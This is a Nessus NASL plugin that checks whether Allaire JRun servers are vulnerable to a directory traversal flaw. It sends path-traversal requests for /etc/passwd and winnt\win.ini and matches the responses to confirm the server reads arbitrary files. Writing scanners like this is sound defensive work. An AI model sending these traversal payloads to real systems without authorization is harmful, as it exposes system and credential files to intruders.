#
# This script was written by H D Moore
#
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added BugtraqID



if(description)
{
    script_id(10997);
    script_version ("$Revision: 1.8 $");
    script_bugtraq_id(3666);
    name["english"] = "JRun directory traversal";
    name["francais"] = "JRun directory traversal";
    script_name(english:name["english"], francais:name["francais"]);

    desc["english"] = " 
This host is running the Allaire JRun web server. Versions 2.3.3, 3.0, and
3.1 are vulnerable to a directory traversal attack.  This allows a potential
intruder to view the contents of any file on the system.

Solution:  The vendor has addressed this issue in Macromedia Product Security
Bulletin MPSB01-17.  Please upgrade to the latest version of JRun available
from http://www.allaire.com/

Risk factor : High";


    script_description(english:desc["english"], francais:desc["francais"]);

    summary["english"] = "Attempts directory traversal attack";
    summary["francais"] = "Attempts directory traversal attack";

    script_summary(english:summary["english"], francais:summary["francais"]);

    script_category(ACT_GATHER_INFO);


    script_copyright(english:"This script is Copyright (C) 2002 Digital Defense Inc.",
	    francais:"Ce script est Copyright (C) 2002 Digital Defense Inc.");
    family["english"] = "CGI abuses";
    family["francais"] = "Abus de CGI";
    script_family(english:family["english"], francais:family["francais"]);
    script_dependencie("find_service.nes", "no404.nasl", "http_version.nasl");
    script_require_ports("Services/www", 8000);
    script_require_keys("www/jrun");
    exit(0);
}

#
# The script code starts here
#

include("http_func.inc");

req_unx = "/../../../../../../../../etc/passwd"; 	pat_unx = "root:";
req_win = "/..\..\..\..\..\..\..\..\winnt\win.ini"; 	pat_win = "[fonts]";

port = get_kb_item("Services/www");
if(!port)port = 8000;

wkey = string("web/traversal/", port);

trav = get_kb_item(wkey);
if (trav) exit(0);

if(get_port_state(port))
{
    soc = http_open_socket(port);
    if(!soc)exit(0);
    req = http_get(item:req_unx, port:port);      
    send(socket:soc, data:req);
    res = http_recv(socket:soc);
    http_close_socket(soc);
    
    if(pat_unx >< res)
    {
        wkey = string("web/traversal/", port);
        set_kb_item(name:wkey, value:TRUE);
        security_hole(port);
        exit(0);
    }
    
    soc = http_open_socket(port);
    if(!soc)exit(0);
    req = http_get(item:req_win, port:port);      
    send(socket:soc, data:req);
    res = http_recv(socket:soc);
    http_close_socket(soc);

    if(pat_win >< res)
    {
        wkey = string("web/traversal/", port);
        set_kb_item(name:wkey, value:TRUE);    
        security_hole(port);
        exit(0);
    }  
}
 
